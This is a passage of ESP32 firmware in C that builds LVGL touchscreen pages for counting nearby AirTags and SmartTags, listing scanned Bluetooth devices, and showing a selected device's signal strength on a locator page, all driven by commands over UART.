                        int airtag_count = 0, smarttag_count = 0;
                        if (sscanf(line_buffer, "%d,%d", &airtag_count, &smarttag_count) == 2) {
                            ESP_LOGI(TAG, "AirTag scan: %d AirTags, %d SmartTags", airtag_count, smarttag_count);
                            
                            bsp_display_lock(0);
                            if (airtag_count_label) {
                                lv_label_set_text_fmt(airtag_count_label, "%d", airtag_count);
                            }
                            if (smarttag_count_label) {
                                lv_label_set_text_fmt(smarttag_count_label, "%d", smarttag_count);
                            }
                            bsp_display_unlock();
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "AirTag scan task ended");
    airtag_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

// Show AirTag scan page (inside current tab's container)
static void show_airtag_scan_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists, just show it
    if (ctx->bt_airtag_page) {
        lv_obj_clear_flag(ctx->bt_airtag_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_airtag_page;
        bt_airtag_page = ctx->bt_airtag_page;
        ESP_LOGI(TAG, "Showing existing AirTag scan page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new AirTag scan page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->bt_airtag_page = lv_obj_create(container);
    bt_airtag_page = ctx->bt_airtag_page;
    lv_obj_set_size(bt_airtag_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(bt_airtag_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(bt_airtag_page, 0, 0);
    lv_obj_set_style_pad_all(bt_airtag_page, 10, 0);
    lv_obj_set_flex_flow(bt_airtag_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(bt_airtag_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(bt_airtag_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, airtag_scan_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "AirTag Scan");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Content container - centered
    lv_obj_t *content = lv_obj_create(bt_airtag_page);
    lv_obj_set_size(content, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(content, 1);
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 20, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    
    // AirTags counter box
    lv_obj_t *airtag_box = lv_obj_create(content);
    lv_obj_set_size(airtag_box, 200, 180);
    lv_obj_set_style_bg_color(airtag_box, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_color(airtag_box, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(airtag_box, 3, 0);
    lv_obj_set_style_radius(airtag_box, 16, 0);
    lv_obj_set_style_pad_all(airtag_box, 15, 0);
    lv_obj_set_flex_flow(airtag_box, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(airtag_box, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(airtag_box, LV_OBJ_FLAG_SCROLLABLE);
    
    airtag_count_label = lv_label_create(airtag_box);
    lv_label_set_text(airtag_count_label, "0");
    lv_obj_set_style_text_font(airtag_count_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(airtag_count_label, COLOR_MATERIAL_AMBER, 0);
    
    lv_obj_t *airtag_label = lv_label_create(airtag_box);
    lv_label_set_text(airtag_label, "AirTags");
    lv_obj_set_style_text_font(airtag_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(airtag_label, lv_color_hex(0xFFFFFF), 0);
    
    // SmartTags counter box
    lv_obj_t *smarttag_box = lv_obj_create(content);
    lv_obj_set_size(smarttag_box, 200, 180);
    lv_obj_set_style_bg_color(smarttag_box, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_color(smarttag_box, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(smarttag_box, 3, 0);
    lv_obj_set_style_radius(smarttag_box, 16, 0);
    lv_obj_set_style_pad_all(smarttag_box, 15, 0);
    lv_obj_set_flex_flow(smarttag_box, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(smarttag_box, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(smarttag_box, LV_OBJ_FLAG_SCROLLABLE);
    
    smarttag_count_label = lv_label_create(smarttag_box);
    lv_label_set_text(smarttag_count_label, "0");
    lv_obj_set_style_text_font(smarttag_count_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(smarttag_count_label, COLOR_MATERIAL_TEAL, 0);
    
    lv_obj_t *smarttag_label = lv_label_create(smarttag_box);
    lv_label_set_text(smarttag_label, "SmartTags");
    lv_obj_set_style_text_font(smarttag_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(smarttag_label, lv_color_hex(0xFFFFFF), 0);
    
    // Start scanning
    ESP_LOGI(TAG, "Starting AirTag scan");
    uart_send_command_for_tab("scan_airtag");
    airtag_scanning = true;
    
    // Also mark in context
    if (ctx) {
        ctx->airtag_scanning = true;
    }
    
    xTaskCreate(airtag_scan_task, "airtag_scan", 4096, (void*)ctx, 5, &airtag_scan_task_handle);
    
    // Set current visible page
    ctx->current_visible_page = ctx->bt_airtag_page;
}

//==================================================================================
// BT Scan Page
//==================================================================================

// Parse BT scan device line
// Format: "  N. XX:XX:XX:XX:XX:XX  RSSI: X dBm  Name: optional"
static bool parse_bt_device_line(const char *line, bt_device_t *dev)
{
    // Find MAC address pattern (XX:XX:XX:XX:XX:XX) in the line
    // Look for the pattern: two hex digits followed by colon, repeated
    const char *p = line;
    const char *mac_start = NULL;
    
    while (*p) {
        // Check if this could be start of a MAC address
        if (isxdigit((unsigned char)p[0]) && isxdigit((unsigned char)p[1]) && p[2] == ':') {
            // Verify it's a full MAC (17 chars: XX:XX:XX:XX:XX:XX)
            int colons = 0;
            bool valid = true;
            for (int i = 0; i < 17 && p[i]; i++) {
                if (i % 3 == 2) {
                    if (p[i] != ':' && i < 15) { valid = false; break; }
                    if (p[i] == ':') colons++;
                } else {
                    if (!isxdigit((unsigned char)p[i])) { valid = false; break; }
                }
            }
            if (valid && colons == 5) {
                mac_start = p;
                break;
            }
        }
        p++;
    }
    
    if (!mac_start) return false;
    
    // Copy MAC
    strncpy(dev->mac, mac_start, 17);
    dev->mac[17] = '\0';
    
    // Find RSSI
    const char *rssi_ptr = strstr(line, "RSSI:");
    if (rssi_ptr) {
        dev->rssi = atoi(rssi_ptr + 5);
    } else {
        dev->rssi = -100;
    }
    
    // Find Name
    const char *name_ptr = strstr(line, "Name:");
    if (name_ptr) {
        name_ptr += 5;
        while (*name_ptr == ' ') name_ptr++;
        strncpy(dev->name, name_ptr, sizeof(dev->name) - 1);
        dev->name[sizeof(dev->name) - 1] = '\0';
        // Trim trailing whitespace
        size_t len = strlen(dev->name);
        while (len > 0 && isspace((unsigned char)dev->name[len - 1])) {
            dev->name[--len] = '\0';
        }
    } else {
        dev->name[0] = '\0';
    }
    
    return true;
}

// Back to BT menu from BT scan page - hide page and show BT menu
static void bt_scan_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    tab_context_t *ctx = get_current_ctx();
    
    // Hide BT scan page
    if (ctx->bt_scan_page) {
        lv_obj_add_flag(ctx->bt_scan_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show BT menu
    if (ctx->bt_menu_page) {
        lv_obj_clear_flag(ctx->bt_menu_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_menu_page;
    }
}

// Rescan button callback
static void bt_scan_rescan_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "BT Scan: Rescan clicked");
    show_bt_scan_page();
}

// Device click callback - opens locator tracking
static void bt_scan_device_click_cb(lv_event_t *e)
{
    int device_idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (device_idx >= 0 && device_idx < bt_device_count) {
        show_bt_locator_page(device_idx);
    }
}

// Show BT Scan page (inside current tab's container)
static void show_bt_scan_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists, just show it
    if (ctx->bt_scan_page) {
        lv_obj_clear_flag(ctx->bt_scan_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_scan_page;
        bt_scan_page = ctx->bt_scan_page;
        ESP_LOGI(TAG, "Showing existing BT scan page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new BT scan page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->bt_scan_page = lv_obj_create(container);
    bt_scan_page = ctx->bt_scan_page;
    lv_obj_set_size(bt_scan_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(bt_scan_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(bt_scan_page, 0, 0);
    lv_obj_set_style_pad_all(bt_scan_page, 10, 0);
    lv_obj_set_flex_flow(bt_scan_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(bt_scan_page, 8, 0);
    
    // Header with back button, title, and rescan button
    lv_obj_t *header = lv_obj_create(bt_scan_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 10, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Left side: Back + Title
    lv_obj_t *left_cont = lv_obj_create(header);
    lv_obj_set_size(left_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(left_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(left_cont, 0, 0);
    lv_obj_set_style_pad_all(left_cont, 0, 0);
    lv_obj_set_flex_flow(left_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(left_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(left_cont, 10, 0);
    lv_obj_clear_flag(left_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *back_btn = lv_btn_create(left_cont);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, bt_scan_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(left_cont);
    lv_label_set_text(title, "BT Scan & Locate");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
    
    // Rescan button on right
    lv_obj_t *rescan_btn = lv_btn_create(header);
    lv_obj_set_size(rescan_btn, 100, 40);
    lv_obj_set_style_bg_color(rescan_btn, COLOR_MATERIAL_CYAN, 0);
    lv_obj_set_style_radius(rescan_btn, 8, 0);
    lv_obj_add_event_cb(rescan_btn, bt_scan_rescan_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *rescan_label = lv_label_create(rescan_btn);
    lv_label_set_text(rescan_label, LV_SYMBOL_REFRESH " Rescan");
    lv_obj_set_style_text_font(rescan_label, &lv_font_montserrat_14, 0);
    lv_obj_center(rescan_label);
    
    // Loading container (shown during scan)
    lv_obj_t *loading_container = lv_obj_create(bt_scan_page);
    lv_obj_set_size(loading_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(loading_container, 1);
    lv_obj_set_style_bg_opa(loading_container, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(loading_container, 0, 0);
    lv_obj_set_flex_flow(loading_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(loading_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(loading_container, LV_OBJ_FLAG_SCROLLABLE);
    
    // Spinner
    lv_obj_t *spinner = lv_spinner_create(loading_container);
    lv_obj_set_size(spinner, 60, 60);
    lv_spinner_set_anim_params(spinner, 1000, 200);
    
    lv_obj_t *loading_label = lv_label_create(loading_container);
    lv_label_set_text(loading_label, "Scanning for BT devices...");
    lv_obj_set_style_text_font(loading_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(loading_label, lv_color_hex(0x888888), 0);
    lv_obj_set_style_pad_top(loading_label, 20, 0);
    
    // Force UI refresh to show loading state - release display lock briefly
    lv_refr_now(NULL);
    bsp_display_unlock();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Flush any stale UART data before scanning
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush_input(uart_port);
    
    // Send scan command to current tab's UART
    uart_send_command_for_tab("scan_bt");
    ESP_LOGI(TAG, "BT Scan: waiting for results (up to 15s)...");
    
    // Read data until we see "Summary:" or timeout
    static char rx_buffer[8192];
    int total_len = 0;
    bool summary_found = false;
    int timeout_ms = 15000;  // 15 second timeout
    int elapsed_ms = 0;
    
    while (!summary_found && elapsed_ms < timeout_ms && total_len < (int)sizeof(rx_buffer) - 256) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Check if we have the complete response
            if (strstr(rx_buffer, "Summary:") != NULL) {
                summary_found = true;
                ESP_LOGI(TAG, "BT Scan: Summary found, scan complete");
            }
        }
        elapsed_ms += 200;
    }
    
    ESP_LOGI(TAG, "BT Scan response (%d bytes, summary=%s)", total_len, summary_found ? "yes" : "no");
    
    // Re-acquire display lock
    bsp_display_lock(0);
    
    // Remove loading indicator
    lv_obj_del(loading_container);
    
    // Status label
    lv_obj_t *status_label = lv_label_create(bt_scan_page);
    lv_obj_set_style_text_font(status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(status_label, lv_color_hex(0x888888), 0);
    
    // Scrollable list container
    lv_obj_t *list_container = lv_obj_create(bt_scan_page);
    lv_obj_set_size(list_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 8, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 6, 0);
    
    // Parse devices
    bt_device_count = 0;
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL && bt_device_count < BT_MAX_DEVICES) {
        // Look for device lines (contain MAC pattern and RSSI)
        if (strstr(line, "RSSI:") != NULL && strchr(line, ':') != NULL) {
            bt_device_t dev;
            if (parse_bt_device_line(line, &dev)) {
                bt_devices[bt_device_count++] = dev;
            }
        }
        line = strtok(NULL, "\n\r");
    }
    
    // Display clickable devices
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_t *dev = &bt_devices[i];
        
        lv_obj_t *row = lv_obj_create(list_container);
        lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_all(row, 10, 0);
        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_add_event_cb(row, bt_scan_device_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
        
        // Name or MAC
        lv_obj_t *name_lbl = lv_label_create(row);
        if (strlen(dev->name) > 0) {
            lv_label_set_text(name_lbl, dev->name);
            lv_obj_set_flex_grow(name_lbl, 1);
            lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
        } else {
            // No name - show full MAC address without truncation
            lv_label_set_text(name_lbl, dev->mac);
            lv_obj_set_width(name_lbl, 155);  // Fixed width for MAC
        }
        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(name_lbl, COLOR_MATERIAL_CYAN, 0);
        
        // MAC (if name exists, show MAC too)
        if (strlen(dev->name) > 0) {
            lv_obj_t *mac_lbl = lv_label_create(row);
            lv_label_set_text(mac_lbl, dev->mac);
            lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(mac_lbl, lv_color_hex(0x888888), 0);
            lv_obj_set_width(mac_lbl, 155);  // Full MAC width (17 chars)
        }
        
        // RSSI
        lv_obj_t *rssi_lbl = lv_label_create(row);
        lv_label_set_text_fmt(rssi_lbl, "%d dBm", dev->rssi);
        lv_obj_set_style_text_font(rssi_lbl, &lv_font_montserrat_14, 0);
        if (dev->rssi > -50) {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_GREEN, 0);
        } else if (dev->rssi > -70) {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_AMBER, 0);
        } else {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_RED, 0);
        }
        lv_obj_set_width(rssi_lbl, 70);
    }
    
    lv_label_set_text_fmt(status_label, "Tap device to locate (%d found)", bt_device_count);
    
    // Set current visible page
    ctx->current_visible_page = ctx->bt_scan_page;
}

//==================================================================================
// BT Locator Tracking Page
//==================================================================================

// Back to BT scan from locator tracking - hide page and show BT scan
static void bt_locator_tracking_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop tracking
    if (bt_locator_tracking) {
        uart_send_command_for_tab("stop");
        bt_locator_tracking = false;
        if (bt_locator_task_handle != NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            bt_locator_task_handle = NULL;
        }
    }
    
    tab_context_t *ctx = get_current_ctx();
    
    // Hide locator tracking page
    if (ctx->bt_locator_page) {
        lv_obj_add_flag(ctx->bt_locator_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show BT scan page
    if (ctx->bt_scan_page) {
        lv_obj_clear_flag(ctx->bt_scan_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_scan_page;
    }
}

static void bt_locator_tracking_task(void *arg)
{
    // Get context passed to task
    tab_context_t *ctx = (tab_context_t *)arg;
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s][BT_LOC] Task started for tab %d, target MAC: '%s'", uart_name, task_tab, bt_locator_target_mac);
    
    static char rx_buffer[256];
    static char line_buffer[128];
    int line_pos = 0;
    int total_bytes_received = 0;
    int lines_parsed = 0;
    int matches_found = 0;
    
    // Use context's flag
    while (ctx && ctx->bt_locator_tracking) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            total_bytes_received += len;
            ESP_LOGD(TAG, "[BT_LOC] UART RX %d bytes (total: %d)", len, total_bytes_received);
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        lines_parsed++;
                        
                        ESP_LOGI(TAG, "[BT_LOC] Line #%d: '%s'", lines_parsed, line_buffer);
                        
                        // Check if line contains our target MAC
                        if (strstr(line_buffer, bt_locator_target_mac) != NULL) {
                            matches_found++;
                            ESP_LOGI(TAG, "[BT_LOC] MAC match #%d found!", matches_found);
                            
                            // Check if device is out of range
                            if (strstr(line_buffer, "not found") != NULL) {
                                ESP_LOGI(TAG, "[BT_LOC] Device out of range");
                                bsp_display_lock(0);
                                if (bt_locator_rssi_label) {
                                    lv_label_set_text(bt_locator_rssi_label, "No signal");
                                    lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_32, 0);
                                    lv_obj_set_style_text_color(bt_locator_rssi_label, lv_color_hex(0x666666), 0);
                                }
                                bsp_display_unlock();
                            } else {
                                // Parse RSSI
                                const char *rssi_ptr = strstr(line_buffer, "RSSI:");
                                if (rssi_ptr) {
                                    int rssi = atoi(rssi_ptr + 5);
                                    ESP_LOGI(TAG, "[BT_LOC] RSSI parsed: %d dBm", rssi);
                                    
                                    bsp_display_lock(0);
                                    if (bt_locator_rssi_label) {
                                        lv_label_set_text_fmt(bt_locator_rssi_label, "%d dBm", rssi);
                                        lv_obj_set_style_text_font(bt_locator_rssi_label, &lv_font_montserrat_44, 0);
                                        if (rssi > -50) {
                                            lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_GREEN, 0);
                                        } else if (rssi > -70) {
                                            lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_AMBER, 0);
                                        } else {
                                            lv_obj_set_style_text_color(bt_locator_rssi_label, COLOR_MATERIAL_RED, 0);
                                        }
                                        ESP_LOGI(TAG, "[BT_LOC] UI updated with RSSI %d", rssi);
                                    } else {
                                        ESP_LOGW(TAG, "[BT_LOC] bt_locator_rssi_label is NULL!");
                                    }
                                    bsp_display_unlock();
                                } else {
                                    ESP_LOGW(TAG, "[BT_LOC] MAC matched but no RSSI: found in line '%s'", line_buffer);
                                }
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "[BT_LOC] Task ended - total bytes: %d, lines: %d, matches: %d", 
             total_bytes_received, lines_parsed, matches_found);
    bt_locator_task_handle = NULL;
    vTaskDelete(NULL);
}

// Show BT Locator Tracking page (inside current tab's container)
static void show_bt_locator_page(int device_idx)
{
    if (device_idx < 0 || device_idx >= bt_device_count) return;
    
    bt_device_t *dev = &bt_devices[device_idx];
    
    // Save target info
    strncpy(bt_locator_target_mac, dev->mac, sizeof(bt_locator_target_mac) - 1);
    strncpy(bt_locator_target_name, dev->name, sizeof(bt_locator_target_name) - 1);
    
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // Note: Locator tracking page is not cached - always recreate
    // because it depends on the selected device
    if (ctx->bt_locator_page) {
        lv_obj_del(ctx->bt_locator_page);
        ctx->bt_locator_page = NULL;
    }
    
    ESP_LOGI(TAG, "Creating new BT locator tracking page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->bt_locator_page = lv_obj_create(container);
    bt_locator_page = ctx->bt_locator_page;
    lv_obj_set_size(bt_locator_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(bt_locator_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(bt_locator_page, 0, 0);
    lv_obj_set_style_pad_all(bt_locator_page, 10, 0);
    lv_obj_set_flex_flow(bt_locator_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(bt_locator_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(bt_locator_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, bt_locator_tracking_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "BT Locator - Tracking");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Content container - centered
    lv_obj_t *content = lv_obj_create(bt_locator_page);
    lv_obj_set_size(content, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(content, 1);
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 20, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(content, 20, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    
    // Device name/MAC
    lv_obj_t *name_lbl = lv_label_create(content);
    if (strlen(bt_locator_target_name) > 0) {
        lv_label_set_text(name_lbl, bt_locator_target_name);
    } else {
        lv_label_set_text(name_lbl, bt_locator_target_mac);
    }
    lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(name_lbl, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_text_align(name_lbl, LV_TEXT_ALIGN_CENTER, 0);
    
    // MAC (if name shown)
    if (strlen(bt_locator_target_name) > 0) {
        lv_obj_t *mac_lbl = lv_label_create(content);
        lv_label_set_text(mac_lbl, bt_locator_target_mac);
        lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_16, 0);
